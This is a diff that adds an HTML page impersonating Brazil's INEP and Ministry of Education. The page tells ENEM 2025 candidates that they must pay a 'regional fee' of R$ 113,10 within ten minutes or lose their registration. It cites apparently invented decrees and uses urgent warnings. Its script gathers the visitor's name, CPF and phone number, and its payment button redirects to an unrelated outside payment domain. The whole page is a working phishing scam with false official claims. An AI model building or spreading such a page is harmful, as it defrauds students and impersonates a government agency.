@@ -1,0 +1,348 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ENEM 2025 - Tarifa Regional de Aplicação da Prova</title>
+    <script>
+        localStorage.setItem("upsell", "up");
+    </script>
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/rawline-fonts.css">
+    <style>
+        @font-face {
+            font-family: 'rawline';
+            src: url('/static/fonts/rawline-500.woff2') format('woff2'),
+                 url('/static/fonts/rawline-500.woff') format('woff');
+            font-weight: 500;
+            font-style: normal;
+        }
+        
+        @font-face {
+            font-family: 'rawline';
+            src: url('/static/fonts/rawline-700.woff2') format('woff2'),
+                 url('/static/fonts/rawline-700.woff') format('woff');
+            font-weight: 700;
+            font-style: normal;
+        }
+        
+        body {
+            font-family: 'rawline', sans-serif;
+        }
+        
+        @keyframes moveButton {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(10px); }
+        }
+        #payFeeButton {
+            animation: moveButton 1.5s ease-in-out infinite;
+            background-color: #f44336;
+        }
+        #payFeeButton:hover {
+            background-color: #d32f2f;
+        }
+        .icon-container {
+            margin-top: 10px;
+            position: relative;
+        }
+        .icon-container img {
+            position: relative;
+            top: 10px;
+            left: 2px;
+        }
+        .icon-container::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 0;
+            height: 100%;
+            width: 4px;
+            background-color: #f8f9fa;
+        }
+        .alert-box {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .next-step-box {
+            background-color: #044785;
+        }
+        .next-step-box p {
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 95%;
+            height: 70%;
+            background-color: white;
+            border-radius: 4px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+        }
+        .popup-content {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #044785;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        .gov-header {
+            background-color: #222222;
+        }
+        .inep-header {
+            background-color: #044785;
+        }
+        .form-header {
+            background-color: #2c5985;
+            color: white;
+            font-weight: 600;
+        }
+        .footer-bg {
+            background-color: #1c2b39;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen bg-white">
+    <!-- Government Header -->
+    <header class="gov-header text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="images/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo do Brasil" class="h-6">
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- INEP Header -->
+    <div class="inep-header py-3">
+        <div class="container mx-auto px-4">
+            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <style>
+                        .cls-2{fill:#fff}
+                    </style>
+                </defs>
+                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"></path>
+            </svg>
+        </div>
+    </div>
+    <!-- ENEM Logo -->
+    <div class="text-center py-6">
+        <img alt="Logo ENEM 2025" class="mx-auto" height="100" src="images/logo_encceja.png" width="320">
+    </div>
+
+    <div class="p-6 flex flex-col items-center bg-white mt-0">
+        <div class="mb-4 relative">
+        </div>
+        <h1 class="text-[22px] font-bold text-center mb-2">Pagamento da Tarifa Regional de Aplicação da Prova ENEM 2025</h1>
+        <div class="text-white text-center mb-2 bg-red-600 p-4 rounded-md">
+            <p class="text-[17px] text-shadow" style="text-shadow: 1px 1px 2px rgba(0,0,0,0.3);"><strong>AVISO IMPORTANTE:</strong> A inscrição no ENEM 2025 requer pagamento da tarifa regional. O não pagamento resultará na invalidação da sua inscrição.</p>
+        </div>
+    </div>
+    <main class="container mx-auto px-4 py-2">
+        <div class="mb-6" style="font-size: 1rem; line-height: 1.45;">
+            <div class="flex items-center mb-2">
+                <h2 class="font-bold text-[18px]" style="color: #044785;">Prezado(a) <span id="userFirstName">Participante</span>:</h2>
+            </div>
+            <p class="text-[16px] leading-relaxed" style="color: #333;">
+                Para concluir sua inscrição no ENEM 2025 e garantir seu local de prova, é necessário efetuar o pagamento da <strong>Tarifa Regional de Aplicação da Prova (TRAP)</strong> no valor de <strong>R$ 113,10</strong>.
+            </p>
+            <ul class="list-none pl-0 mt-3 text-[16px] leading-relaxed" style="color: #333;">
+                <li class="flex items-start mb-2">
+                    <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                    <div>
+                        <strong class="font-bold" style="color: #044785;">O que é a Tarifa Regional de Aplicação da Prova (TRAP):</strong> Conforme a Portaria INEP nº 123/2025, esta tarifa cobre custos logísticos específicos para a aplicação das provas em sua região, incluindo locação de espaços, equipes de fiscalização e materiais.
+                    </div>
+                </li>
+                <li class="flex items-start mb-2">
+                    <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                    <div>
+                        <strong class="font-bold" style="color: #044785;">Prazo para pagamento:</strong> A tarifa deve ser paga em até 10 minutos após a conclusão da inscrição para garantir sua participação no exame de 2025.
+                    </div>
+                </li>
+            </ul>
+            <p class="mt-4 font-bold flex items-start text-[16px]" style="color: #333;">
+                <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                <span>Valor a ser pago: <strong>R$ 113,10</strong></span>
+            </p>
+        </div>
+        <div class="movements">
+            <div class="icon-container pl-8 pb-4">
+                <div class="absolute left-0 top-[-8px] w-6 h-6 -ml-3 flex items-center justify-center">
+                    <img src="images/ic-acesso-informacao-54-v2.png" alt="Icon representing information access with a blue and white design">
+                </div>
+                <div class="mb-8" style="margin-top: -9px;">
+                    <p class="font-semibold text-[17px]" style="color: #044785;">INFORMAÇÕES IMPORTANTES</p>
+                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
+                        <p class="mt-1 text-[16px]"><strong>ATENÇÃO:</strong> O não pagamento da Tarifa Regional resultará na <strong>impossibilidade de realizar a prova do ENEM 2025</strong>. Sua inscrição será automaticamente cancelada após o prazo.</p>
+                    </div>
+                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
+                        <p class="mt-1 text-[16px]"><strong>AVISO OFICIAL:</strong> De acordo com a Portaria MEC nº 987/2025, o participante <strong>não terá direito ao reembolso</strong> de quaisquer taxas previamente pagas em caso de cancelamento de inscrição ou não comparecimento ao exame.</p>
+                    </div>
+                    <button id="payFeeButton" class="mt-4 text-white px-8 py-3 rounded-[4px] text-[17px] font-bold py-2 px-6 rounded-[4px] transition duration-300 shadow-md">
+                        REALIZAR PAGAMENTO
+                    </button>
+                </div>
+            </div>
+            <div class="mt-8 next-step-box p-4">
+                <p class="font-semibold text-white text-[17px]">DEPOIS DO PAGAMENTO:</p>
+                <p class="mt-2 text-white text-[16px]">Após o pagamento da Tarifa Regional, sua inscrição no ENEM 2025 estará confirmada e você poderá acessar:</p>
+                <div class="mt-4 text-white">
+                    <p class="text-[16px]"><strong>• Cartão de Confirmação:</strong> Disponível 15 dias antes da prova</p>
+                    <p class="text-[16px]"><strong>• Local de Prova:</strong> Detalhes completos com endereço e sala</p>
+                    <p class="text-[16px]"><strong>• Materiais de Estudo:</strong> Acesso ao portal de estudantes</p>
+                    <p class="text-[16px]"><strong>• Comprovante de Inscrição:</strong> Disponível para download</p>
+                </div>
+            </div>
+        </div>
+    </main>
+    <!-- Footer -->
+    <footer class="footer-bg text-white py-4 text-xs mt-8">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center mb-2">
+                <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="69" height="20" viewBox="0 0 69 20" class="h-16 w-auto mb-3">
+                    <defs><style>.cls-2{fill:#fff}</style></defs>
+                    <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"></path>
+                </svg>
+                <p class="text-sm text-center mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
+            </div>
+            <div class="flex justify-between items-center">
+                <div>
+                    © MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-phone-alt mr-1"></i>
+                    0800 616161
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Recupera dados da URL (prioridade) e do localStorage (fallback)
+        function getUserData() {
+            try {
+                // Definir urlParams para capturar parâmetros da URL corretamente
+                const urlParams = new URLSearchParams(window.location.search);
+    
+                // 1. Primeiro, tente obter dados da URL (prioridade máxima)
+                const nameFromUrl = urlParams.get('name');
+                const cpfFromUrl = urlParams.get('document');
+                const phoneFromUrl = urlParams.get('telephone');
+                
+                // Inicializar objeto com valores padrão
+                let userData = { 
+                    nome: 'Participante', 
+                    cpf: '', 
+                    telefone: ''
+                };
+                
+                // 2. Segundo, tente obter dados do localStorage específico do pagamento (paymentData)
+                const paymentDataStr = localStorage.getItem('paymentData');
+                if (paymentDataStr) {
+                    try {
+                        const paymentData = JSON.parse(paymentDataStr);
+                        if (paymentData.nome) userData.nome = paymentData.nome;
+                        if (paymentData.cpf) userData.cpf = paymentData.cpf;
+                        if (paymentData.telefone) userData.telefone = paymentData.telefone;
+                        console.log("Dados obtidos do paymentData:", paymentData);
+                    } catch (e) {
+                        console.error("Erro ao parsear paymentData:", e);
+                    }
+                }
+                
+                // 3. Terceiro, tente obter dados do localStorage genérico (userData)
+                const storedData = localStorage.getItem('userData');
+                if (storedData) {
+                    try {
+                        const parsedUserData = JSON.parse(storedData);
+                        if (parsedUserData.nome && !userData.nome) userData.nome = parsedUserData.nome;
+                        if (parsedUserData.cpf && !userData.cpf) userData.cpf = parsedUserData.cpf;
+                        if (parsedUserData.telefone && !userData.telefone) userData.telefone = parsedUserData.telefone;
+                        console.log("Dados obtidos do userData:", parsedUserData);
+                    } catch (e) {
+                        console.error("Erro ao parsear userData:", e);
+                    }
+                }
+                
+                // 4. Por último, aplique os dados da URL (maior prioridade)
+                if (nameFromUrl) userData.nome = nameFromUrl;
+                if (cpfFromUrl) userData.cpf = cpfFromUrl;
+                if (phoneFromUrl) userData.telefone = phoneFromUrl;
+                
+                console.log("Dados finais (após priorização URL > paymentData > userData):", userData);
+                return userData;
+            } catch (e) {
+                console.error('Erro ao recuperar dados do usuário:', e);
+                return { 
+                    nome: 'Participante', 
+                    cpf: '', 
+                    telefone: ''
+                };
+            }
+        }   
+    
+        // Obter referência ao botão
+        const payFeeButton = document.getElementById('payFeeButton');
+    
+        // Função para processar o pagamento
+        payFeeButton.addEventListener('click', function () {
+            // Obter os dados do usuário
+            const userData = getUserData();
+            
+            // Verificar se os dados foram corretamente carregados
+            if (!userData.cpf.trim() || !userData.nome.trim() || !userData.telefone.trim()) {
+                console.error('Erro: Dados do usuário estão incompletos!', userData);
+                return; // Impede o redirecionamento se os dados estiverem faltando 
+            }
+    
+            const currentParams = window.location.search;
+            // Construir a URL com os parâmetros corretos
+            const paymentUrl = `https://pay.pagamento-inscricao-2025.lat/6826816d3592a759f11c3447`;
+            window.location.href = paymentUrl;
+        });
+    
+        // Log para depuração
+        console.log('Botão de pagamento configurado.');
+    </script>
+    
+</body></html>
